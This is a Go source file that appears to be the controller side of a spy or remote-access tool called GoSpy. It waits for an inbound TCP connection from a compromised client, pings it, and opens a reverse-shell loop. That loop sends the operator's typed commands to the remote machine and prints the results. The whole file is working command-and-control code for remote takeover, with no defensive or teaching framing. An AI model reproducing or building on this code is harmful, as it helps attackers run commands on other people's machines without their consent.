package client

import (
	"bufio"
	"fmt"
	"github.com/psidex/GoSpy/internal/comms"
	"net"
	"os"
	"strings"
)

// GoSpyClient represents a GoSpy client that is connected to this server.
type GoSpyClient struct {
	conn        net.Conn // The instantiated connection to the client.
	bindAddress string   // The address to listen on for the inbound client connection.
}

// NewGoSpyClient creates instantiates a GoSpyClient.
func NewGoSpyClient(bindAddress string) (client GoSpyClient) {
	return GoSpyClient{bindAddress: bindAddress}
}

// sendString sends a string to the client.
func (c GoSpyClient) sendString(message string) (err error) {
	return comms.SendStringTo(c.conn, message)
}

// recvString receives a string from the client.
func (c GoSpyClient) recvString() (message string, err error) {
	return comms.RecvStringFrom(c.conn)
}

// CloseConn closes the conn.
func (c GoSpyClient) CloseConn() (err error) {
	return c.conn.Close()
}

// WaitForConn starts a tcp server and waits for a single successful connection.
func (c *GoSpyClient) WaitForConn() (err error) {
	l, err := net.Listen("tcp", c.bindAddress)
	if err != nil {
		return err
	}
	defer l.Close() // Closing the server won't close the already established client connection.

	for {
		conn, err := l.Accept()
		if err == nil {
			c.conn = conn
			return nil
		}
	}
}

// Ping sends a "ping" to the client and waits for a "pong".
func (c GoSpyClient) Ping() (response string, err error) {
	err = c.sendString("ping")
	if err != nil {
		return "", err
	}
	return c.recvString()
}

// EnterReverseShellRepl initiates a REPL with the client.
func (c GoSpyClient) EnterReverseShellRepl() (err error) {
	err = c.sendString("reverse-shell")
	if err != nil {
		return err
	}

	for {
		fmt.Print("\n$ ")

		reader := bufio.NewReader(os.Stdin)
		text, _ := reader.ReadString('\n')
		text = strings.TrimSpace(text)

		err := c.sendString(text)
		if err != nil {
			return err
		}

		// Exit after sending exit to client.
		if text == "exit" {
			return nil
		}

		resp, err := c.recvString()
		if err != nil {
			return err
		}

		fmt.Println(resp)
	}
}
